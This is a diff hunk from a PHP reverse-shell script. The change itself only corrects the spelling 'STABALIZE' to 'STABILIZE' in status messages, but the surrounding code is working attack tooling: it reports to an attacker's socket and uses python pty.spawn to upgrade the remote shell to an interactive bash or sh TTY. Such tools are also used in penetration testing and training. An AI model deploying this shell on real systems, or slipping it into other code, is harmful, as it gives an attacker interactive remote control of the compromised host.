@@ -62,31 +62,31 @@
 
 
     //attempt to stablize shell
-    fwrite($socket, "[*] ATTEMPTING TO STABALIZE SHELL\n");
+    fwrite($socket, "[*] ATTEMPTING TO STABILIZE SHELL\n");
 
     if ( cmdExists("python") && cmdExists("bash") )
     {
         fwrite($pipes[0], "python -c 'import pty; pty.spawn(\"/bin/bash\")'");
-        fwrite($socket, "[+] SHELL STABALIZED :: HIT 'ENTER'\n");
+        fwrite($socket, "[+] SHELL STABILIZED :: HIT 'ENTER'\n");
     }
     elseif ( cmdExists("python3") && cmdExists("bash") )
     {
         fwrite($pipes[0], "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'");
-        fwrite($socket, "[+] SHELL STABALIZED :: HIT 'ENTER'\n");
+        fwrite($socket, "[+] SHELL STABILIZED :: HIT 'ENTER'\n");
     }
     elseif ( cmdExists("python") )
     {
         fwrite($pipes[0], "python -c 'import pty; pty.spawn(\"/bin/sh\")'");
-        fwrite($socket, "[+] SHELL STABALIZED :: HIT 'ENTER'\n");
+        fwrite($socket, "[+] SHELL STABILIZED :: HIT 'ENTER'\n");
     }
     elseif ( cmdExists("python3") )
     {
         fwrite($pipes[0], "python3 -c 'import pty; pty.spawn(\"/bin/sh\")'");
-        fwrite($socket, "[+] SHELL STABALIZED :: HIT 'ENTER'\n");
+        fwrite($socket, "[+] SHELL STABILIZED :: HIT 'ENTER'\n");
     }
     else 
     {
-        fwrite($socket, "[-] UNABLE TO STABALIZE SHELL\n[-] TTY FUNCTIONALITY IS NOT AVAILABLE\n");
+        fwrite($socket, "[-] UNABLE TO STABILIZE SHELL\n[-] TTY FUNCTIONALITY IS NOT AVAILABLE\n");
     }
 
     // now we've got a reverse shell.
